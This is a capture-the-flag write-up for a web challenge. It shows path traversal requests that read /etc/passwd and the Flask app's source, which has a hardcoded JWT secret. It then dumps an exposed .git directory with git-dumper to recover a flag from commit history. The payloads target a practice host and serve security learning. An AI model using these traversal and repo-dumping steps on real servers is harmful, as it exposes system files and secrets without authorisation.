---
layout: post
title:  "SWE Intern at Girly Pop Inc"
date:   2026-01-12 01:04:10 -0400
author: robo.uzi
tags: [CTF]
permalink: /scarletCTF-swe-intern/
---

**Title**: SWE Intern at Girly Pop Inc

**Category**: Web

**Author**: ilyree

**Description**: Last week we fired an intern at Girlie Pop INC for stealing too much food from the office. It seems they didn't know much about secure software development either... [https://girly.ctf.rusec.club](https://girly.ctf.rusec.club)

First I found that `https://girly.ctf.rusec.club/view?page=../../../../etc/passwd` works (as well as `https://girly.ctf.rusec.club/view?page=/etc/pass`). Things line `/proc/self/mountinfo` are inaccessible.

On `https://girly.ctf.rusec.club/view?page=../../../../app/app.py`:
```python
from flask import Flask, request, render_template, send_file
import jwt
import datetime
import os
# commment for testing
app = Flask(__name__)
app.config['SECRET_KEY'] = 'f0und_my_k3y_1_gu3$$'

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/generate', methods=['POST'])
def generate():
    username = request.form.get('username', 'guest')
    payload = {
        'user': username,
        'iat': datetime.datetime.utcnow(),
        'exp': datetime.datetime.utcnow() + datetime.timedelta(minutes=30),
        'role': 'standard_user'
    }
    token = jwt.encode(payload, app.config['SECRET_KEY'], algorithm="HS256")
    return render_template('index.html', token=token)

@app.route('/view')
def view():

    page = request.args.get('page')
    if not page:
        return "Missing 'page' parameter", 400
    base_dir = os.path.dirname(os.path.abspath(__file__))
    target_path = os.path.abspath(os.path.join(base_dir, 'static', page))

    try:
        file_path = os.path.join('static', page)
        return send_file(file_path)
    except Exception:
        return "File not found or access denied.", 404

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
```

`https://girly.ctf.rusec.club/view?page=../.git/HEAD` tipped me off that I need to dump the git repo. 

Not sure if this was meant to be accessible:
`https://girly.ctf.rusec.club/view?page=../../../../app/writeup.md`:
```shell
cat writeup.md  
/view?page= is vulnerable to path traversal and returns files from static. /view?page=../../../../etc/passwd  
  
The about page tips off about .git being accessible with "Automated via Git-Hooks"    
After visiting ../.git/config, you can access all the information you need to reconstruct the git directory with:    
  
../.git/config  
../.git/HEAD  
../.git/index (recursively download all of the objects inside of this)  
  
Alteratively, you could just run git-dumper against ../.git    
> git-dumper http://girlypop.ctf.rusec.club/../git/ dump_repo
```

Apparently there was an issue with this challenge. I was doing the right thing but the repo was messed up and did not contain the flag. Woke up on the last day and I found the flag in about 2 minutes as opposed to the hours I spent looking before :)

I ran `git-dumper https://girly.ctf.rusec.club/view?page=../.git dump_repo`.


```shell
git show 9e26820af5010a2afa8e4c09023c1ee078e8e8aa  
commit 9e26820af5010a2afa8e4c09023c1ee078e8e8aa (HEAD -> master)  
Author: intern-3 <nobody@nobody.com>  
Date:   Sun Jan 11 15:20:49 2026 +0100  
  
   removed flag  
  
diff --git a/flag.txt b/flag.txt  
deleted file mode 100644  
index 61f9cd8..0000000  
--- a/flag.txt  
+++ /dev/null  
@@ -1 +0,0 @@  
-RUSEC{a1way$_1gnor3_3nv_f1l3s_up47910k390cyhu623}
```

`RUSEC{a1way$_1gnor3_3nv_f1l3s_up47910k390cyhu623}`